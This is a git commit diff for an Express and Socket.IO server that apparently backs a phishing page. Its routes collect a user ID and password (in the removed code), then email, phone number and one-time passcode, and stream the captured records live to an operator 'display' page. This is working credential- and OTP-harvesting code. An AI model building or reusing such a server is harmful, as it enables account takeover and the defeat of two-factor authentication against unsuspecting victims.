388c09f3d86fc937a780516e3cc90ad0b91023f3
mayson96 <maysonusher3@gmail.com>
2024-07-25 18:27:32 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,84 +1,76 @@
 const express = require('express');
+const path = require('path');
 const http = require('http');
-const bodyParser = require('body-parser');
 const socketIo = require('socket.io');
+const bodyParser = require('body-parser');
+
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server);
-const PORT = 3000;
 
-let userData = [];
+const port = process.env.PORT || 3000;
 
+// Middleware
+app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.json());
-app.use(express.static('public'));
 
+// Sample in-memory data storage (in real apps, consider using a database)
+let userData = {};
+
+// Routes
 app.get('/', (req, res) => {
-  res.sendFile(__dirname + '/public/index.html');
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/email.html', (req, res) => {
-  res.sendFile(__dirname + '/public/email.html');
+app.get('/email', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'email.html'));
 });
 
-app.get('/phone.html', (req, res) => {
-  res.sendFile(__dirname + '/public/phone.html');
+app.get('/phone', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'phone.html'));
 });
 
-app.get('/otp.html', (req, res) => {
-  res.sendFile(__dirname + '/public/otp.html');
-});
-
-app.post('/submit', (req, res) => {
-  const { userId, password } = req.body;
-  userData.push({ userId, password });
-  io.emit('dataUpdated', userData);
-  res.json(userData);
-});
-
-app.post('/submit-email', (req, res) => {
-  const { email } = req.body;
-  if (userData.length > 0) {
-    userData[userData.length - 1].email = email;
-    io.emit('dataUpdated', userData);
-  }
-  res.json(userData);
-});
-
-app.post('/submit-phone', (req, res) => {
-  const { phone } = req.body;
-  if (userData.length > 0) {
-    userData[userData.length - 1].phone = phone;
-    io.emit('dataUpdated', userData);
-  }
-  res.json(userData);
-});
-
-app.post('/submit-otp', (req, res) => {
-  const { otp } = req.body;
-  if (userData.length > 0) {
-    userData[userData.length - 1].otp = otp;
-    io.emit('dataUpdated', userData);
-  }
-  res.json(userData);
-});
-
-app.get('/data', (req, res) => {
-  res.json(userData);
+app.get('/otp', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'OTP.html'));
 });
 
 app.get('/display', (req, res) => {
-  res.sendFile(__dirname + '/public/display.html');
+    res.sendFile(path.join(__dirname, 'public', 'display.html'));
 });
 
+// API Endpoints to receive data
+app.post('/submit-email', (req, res) => {
+    const { userId, email } = req.body;
+    userData[userId] = { ...userData[userId], email };
+    io.emit('dataUpdated', Object.values(userData));
+    res.json({ status: 'Email received' });
+});
+
+app.post('/submit-phone', (req, res) => {
+    const { userId, phone } = req.body;
+    userData[userId] = { ...userData[userId], phone };
+    io.emit('dataUpdated', Object.values(userData));
+    res.json({ status: 'Phone number received' });
+});
+
+app.post('/submit-otp', (req, res) => {
+    const { userId, otp } = req.body;
+    userData[userId] = { ...userData[userId], otp };
+    io.emit('dataUpdated', Object.values(userData));
+    res.json({ status: 'OTP received' });
+});
+
+// Socket.IO connection
 io.on('connection', (socket) => {
-  console.log('A user connected');
-  socket.emit('dataUpdated', userData);
+    console.log('A user connected');
+    socket.emit('dataUpdated', Object.values(userData));
 
-  socket.on('disconnect', () => {
-    console.log('A user disconnected');
-  });
+    socket.on('disconnect', () => {
+        console.log('A user disconnected');
+    });
 });
 
-server.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
+// Start server
+server.listen(port, () => {
+    console.log(`Server running on port ${port}`);
 });
